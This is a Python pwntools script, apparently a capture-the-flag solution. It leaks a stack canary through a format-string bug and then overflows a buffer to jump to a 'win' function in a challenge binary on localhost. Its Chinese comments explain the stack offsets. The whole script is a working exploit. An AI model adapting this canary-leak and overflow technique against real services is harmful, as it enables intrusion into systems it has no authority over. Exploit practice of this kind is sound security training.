#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
from pwn import *

HERE = os.path.dirname(os.path.abspath(__file__))
HOST = os.environ.get('HOST', '127.0.0.1')
PORT = int(os.environ.get('PORT', '9108'))

context(arch='amd64', os='linux', log_level='info')

elf = ELF(os.path.join(HERE, '..', 'files', 'pwn'))
win = elf.symbols['win']

p = remote(HOST, PORT)
p.recv(timeout=1)
# 第一次 read 只读 63 字节，canary 完好；printf(buf) 泄露
# buf 在 rbp-0x50 = printf 的第 6 个位置参数，canary 在 rbp-8 -> %15$p
p.send(b'%15$p')
time.sleep(0.2)
line = p.recvuntil(b'\n', timeout=3)
canary = int(line.split(b'echo: ')[1].strip(), 16)
log.info('canary = %#x', canary)

# 第二次 read 0x200 字节：buf(72) + canary + saved rbp + ret
payload = b'A' * 72 + p64(canary) + p64(0) + p64(win)
p.send(payload)
print(p.recvall(timeout=3).decode(errors='replace'))
